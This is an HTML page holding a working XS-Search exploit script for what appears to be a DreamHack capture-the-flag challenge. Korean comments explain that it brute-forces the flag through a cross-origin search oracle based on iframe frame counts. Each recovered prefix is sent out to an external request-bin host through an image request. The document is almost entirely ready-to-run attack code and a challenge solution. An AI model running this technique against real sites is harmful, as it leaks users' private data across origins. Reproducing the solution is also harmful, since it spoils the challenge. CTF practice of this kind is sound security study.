<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>XS-Search Exploit</title>
  </head>
  <body>
    <iframe id="iframe"></iframe>
    <img id="img" />
    <script>
      const iframe = document.getElementById("iframe");
      const img = document.getElementById("img");

      // iframe 한 번 로드해서, 내부에 iframe(srcdoc)이 있으면 "검색 성공"으로 보는 함수입니다.
      // 이건 답지 구조를 그대로 따르고 있습니다.
      async function req(url) {
        return await new Promise((resolve, reject) => {
          iframe.src = url;
          iframe.onload = () => {
            // iframe.contentWindow.frames.length:
            //   - 0  : search 실패 (결과 없음, 내부 iframe 없음)
            //   - !=0: search 성공 (FLAG / note가 매치되어 search.html 안에 <iframe srcdoc=...> 생김)
            if (iframe.contentWindow.frames.length !== 0) return resolve();
            else return reject();
          };
        });
      }

      // 실제로 /search?query=... 를 호출하는 래퍼입니다.
      async function search(query) {
        // localhost:8000 → 컨테이너 안에서는 127.0.0.1 과 동일하게 동작합니다.
        // query는 DH{[0-9a-f]*} 형식이라 encodeURIComponent 없이도 문제될 문자는 없지만,
        // 깔끔하게 하기 위해 인코딩을 한 번 거쳤습니다.
        const url =
          "http://localhost:8000/search?query=" + encodeURIComponent(query);

        try {
          await req(url);
          return true;
        } catch (e) {
          return false;
        }
      }

      async function exploit() {
        // 플래그 포맷: DH{[0-9a-f]{32}}
        let chars = "0123456789abcdef}";
        let secret = "DH{"; // 현재까지 찾은 prefix

        // '}'가 나올 때까지 계속 붙여 나갑니다.
        while (!secret.includes("}")) {
          for (let c of chars) {
            const candidate = secret + c;

            // XS-Search로 "candidate"가 FLAG의 부분 문자열인지 확인합니다.
            // query in note 이고, FLAG가 note에 들어있다는 점을 이용한 것입니다.
            if (await search(candidate)) {
              secret += c;

              // 매 번 한 글자 찾을 때마다 DreamHack request bin으로 전송
              // 여기 도메인은 네가 지금 사용 중인 것으로 바꿔둔 것입니다.
              img.src =
                "https://yvwsiid.request.dreamhack.games/" +
                encodeURIComponent(secret);

              console.log("FOUND:", secret);
              break;
            }
          }
        }
      }

      exploit();
    </script>
  </body>
</html>